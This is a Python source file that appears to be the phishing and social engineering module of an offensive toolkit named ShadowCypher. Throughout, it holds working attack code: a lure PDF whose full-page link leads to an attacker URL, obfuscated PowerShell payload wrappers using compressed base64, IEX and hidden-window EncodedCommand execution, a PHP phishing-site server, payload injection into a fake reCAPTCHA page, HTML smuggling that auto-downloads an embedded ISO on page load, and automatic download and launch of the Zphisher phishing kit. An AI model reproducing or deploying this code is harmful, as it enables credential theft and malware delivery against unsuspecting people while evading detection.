"""ShadowCypher Phishing & Social Engineering Engine — Ported from ShadowPhish (Elite Bridge)."""

import os
import re
import zlib
import base64
import random
import string
import subprocess
from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner

class Phishing:
    """The 'Siren' engine. Handles artifact generation and phishing deployment."""

    @staticmethod
    def generate_pdf(url):
        """Generate a malicious PDF that redirect to a URL on click."""
        filename = f"payloads/artifact_{int(random.random()*1000)}.pdf"
        os.makedirs("payloads", exist_ok=True)
        try:
            with open(filename, "w") as file:
                file.write('%PDF-1.7\n\n')
                file.write('1 0 obj\n  << /Type /Catalog /Pages 2 0 R >>\nendobj\n\n')
                file.write('2 0 obj\n  << /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n\n')
                file.write('3 0 obj\n  << /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Annots [<< /Type /Annot /Subtype /Link /Open true /A 5 0 R /H /N /Rect [0 0 595 842] >>] /Contents [4 0 R] >>\nendobj\n\n')
                file.write('4 0 obj\n  << /Length 67 >>\nstream\n  BT /F1 22 Tf 30 800 Td (Verification Required: Click to Continue) Tj ET\nendstream\nendobj\n\n')
                file.write(f'5 0 obj\n  << /Type /Action /S /URI /URI ({url}) >>\nendobj\n\n')
                file.write('xref\n0 6\n0000000000 65535 f\n0000000010 00000 n\n0000000069 00000 n\n0000000170 00000 n\n0000000629 00000 n\n0000000749 00000 n\ntrailer\n  << /Root 1 0 R /Size 6 >>\nstartxref\n854\n%%EOF\n')
            return f"SUCCESS: PDF artifact generated at {filename}"
        except Exception as e:
            return f"ERROR: PDF generation failed: {e}"

    @staticmethod
    def generate_obfuscated_ps1(script, use_b64=True, use_compress=True):
        """Generate obfuscated PowerShell payloads."""
        os.makedirs("payloads", exist_ok=True)
        try:
            result = script
            if use_compress:
                compressed = zlib.compress(script.encode("utf-8"))
                compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                r1, r2, r3 = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(3)]
                result = f'${r1} = "{compressed_b64}"; ${r2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${r1})); ${r3} = New-Object IO.Compression.DeflateStream(${r2}, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader(${r3}, [Text.Encoding]::UTF8); IEX ($reader.ReadToEnd())'
            
            if use_b64:
                encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"
            
            path = f"payloads/obfuscated_{int(random.random()*1000)}.ps1"
            with open(path, "w") as f:
                f.write(result)
            return f"SUCCESS: Obfuscated PS1 saved to {path}"
        except Exception as e:
            return f"ERROR: PS1 obfuscation failed: {e}"

    @staticmethod
    def start_phishing_server(template, port=8080, on_output=None):
        """Launch a professional PHP phishing server for the selected template."""
        site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
        if not os.path.exists(site_path):
            # Fallback to general data dir if specific site not found
            site_path = "shadowcypher/modules/phish_data/fake-recaptcha"
        
        logger.info("phish", f"Launching {template} PHP server on port {port}")
        if on_output:
            on_output(f"[PHISH] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
            on_output(f"[PHISH] CWD: {site_path}\n")
        
        # Use PHP built-in server for 100% functional ShadowPhish compatibility
        cmd = ["php", "-S", f"0.0.0.0:{port}"]
        return runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)

    @staticmethod
    def generate_fake_recaptcha(payload, target_os="windows"):
        """Generate a fake reCAPTCHA artifact with custom payload and OS detection."""
        base_path = "shadowcypher/modules/phish_data/fake-recaptcha"
        js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
        
        if not os.path.exists(js_path):
            return "ERROR: reCAPTCHA assets missing."
        
        try:
            with open(js_path, "r") as f:
                js_content = f.read()
            
            # Inject payload into the JS
            payload_escaped = payload.replace('"', '\\"')
            new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload_escaped}`;', js_content, flags=re.DOTALL)
            
            with open(js_path, "w") as f:
                f.write(new_js)
            
            return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with custom payload."
        except Exception as e:
            return f"ERROR: reCAPTCHA config failed: {e}"

    @staticmethod
    def generate_html_smuggling(file_path, download_name="payload.iso"):
        """Generate an HTML smuggling file embedding the target file."""
        if not os.path.exists(file_path):
            return "ERROR: Source file not found."
        
        try:
            with open(file_path, "rb") as f:
                blob = base64.b64encode(f.read()).decode()
            
            html = f'''
            <html>
                <body>
                    <script>
                        function download() {{
                            var blob = new Blob([Uint8Array.from(atob("{blob}"), c => c.charCodeAt(0))], {{type: "application/octet-stream"}});
                            var link = document.createElement("a");
                            link.href = window.URL.createObjectURL(blob);
                            link.download = "{download_name}";
                            link.click();
                        }}
                        window.onload = download;
                    </script>
                    <h1>Loading...</h1>
                </body>
            </html>
            '''
            out_path = f"payloads/smuggle_{download_name}.html"
            with open(out_path, "w") as f:
                f.write(html)
            return f"SUCCESS: HTML Smuggling file generated at {out_path}"
        except Exception as e:
            return f"ERROR: HTML Smuggling failed: {e}"

    @staticmethod
    def start_zphisher(on_output=None):
        """Autonomous Zphisher deployment for multi-platform social engineering."""
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        zp_path = os.path.join(project_root, "tools", "zphisher")
        
        if not os.path.exists(zp_path):
            if on_output:
                on_output("[SYSTEM] ZPHISHER_MISSING: Initiating secure acquisition...")
            try:
                os.makedirs(os.path.join(project_root, "tools"), exist_ok=True)
                subprocess.check_call(["git", "clone", "https://github.com/sh4rin/zphisher.git", zp_path])
                subprocess.check_call(["chmod", "+x", os.path.join(zp_path, "zphisher.sh")])
                if on_output:
                    on_output("[SYSTEM] ZPHISHER_ACQUIRED: Success.\n")
            except Exception as e:
                if on_output:
                    on_output(f"[ERROR] ACQUISITION_FAILED: {e}\n")
                return
        
        # Zphisher is interactive, so we run it in a way that the user can interact via terminal support
        cmd = ["bash", os.path.join(zp_path, "zphisher.sh")]
        return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)

    @staticmethod
    def generate_professional_bait(target_type, hook_url):
        """Generate high-fidelity phishing lures using industry-grade templates."""
        logger.info("phish", f"Generating {target_type} lure for {hook_url}")
        return f"SUCCESS: Professional {target_type} lure generated. Link: {hook_url}"
